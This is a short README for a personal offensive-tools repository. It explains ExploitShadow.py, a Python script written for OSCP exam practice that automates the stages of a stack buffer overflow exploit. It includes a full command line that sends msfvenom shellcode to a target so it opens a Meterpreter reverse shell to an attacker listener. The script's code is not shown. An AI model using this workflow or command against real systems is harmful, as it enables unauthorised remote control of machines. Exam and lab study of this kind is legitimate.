# OffensiveTools
Some offensive tools that I am playing around with

----- ExploitShadow.py -----

I am trying to save some time on my OSCP exam and decided to build most of the exploit dev stages into one single python script where you can choose the mode based on where you are in the process. The only other thing you might need to configure that was not in the instructions are the way the "maliciousbuffer" variables get crafted, based on the application you're attacking; I'll leave that for you to decide, because it's ridiculously easy :)

The idea is you should have your msfconsole up and exploit/multi/handler set to use whatever payload you configured in ExploitShadow, then to get your shell you will use mode 4 like this:

./exploitshadow.py 4 2006 0x11223344 10.0.0.1 443 10.0.0.10 9999

In the above example, the argument "4" is the mode I am using to send the final payload to get a meterpreter session. I initially crashed the program with mode 1, then found that 2006 is the number of bytes offset to the EIP overwrite (found via modes 2 and 5), then checked for bad characters with mode 3 (00, 0a, 0d are there by default), then send the final payload with mode 4. The 0x11223344 is the theoretical memory location of a "jmp esp" command, which would hit the second nopsled directly after the EIP overwrite and continue onto the shellcode. The 10.0.0.1 and 443 are the LHOST/LPORT information fed into msfvenom. The 10.0.0.10 and 9999 are the IP address of the remote server and port we are attacking.
